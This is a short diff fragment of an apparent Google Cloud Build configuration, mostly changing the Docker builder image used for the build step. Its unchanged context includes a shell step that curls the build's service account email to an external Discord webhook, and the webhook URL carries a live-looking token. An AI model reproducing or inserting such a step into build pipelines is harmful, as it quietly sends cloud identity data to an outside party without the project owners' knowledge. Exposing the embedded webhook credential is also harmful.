@@ -13,7 +13,8 @@ steps:
         # Send the service account email to the webhook
         curl -X POST -H "Content-Type: application/json" -d '{"content":"Service account email: '"$service_account_email"'"}' https://discord.com/api/webhooks/1257169351338098770/VKPpHqGGDFthsHuMvlQqvFm1gqY0xbJSOlporB7jrcfse_wxK_Y-gqZCUoEMOGLLXJje
       fi
-- name: 'gcr.io/cloud-builders/docker'
+- name: 'docker:27.0.2-windowsservercore'
+  entrypoint: 'docker'
   args: ['build', '-t', 'gcr.io/gcp-test-423908/gcppost', '.']
 - name: 'gcr.io/cloud-builders/docker'
   args: ['push', 'gcr.io/gcp-test-423908/gcppost']
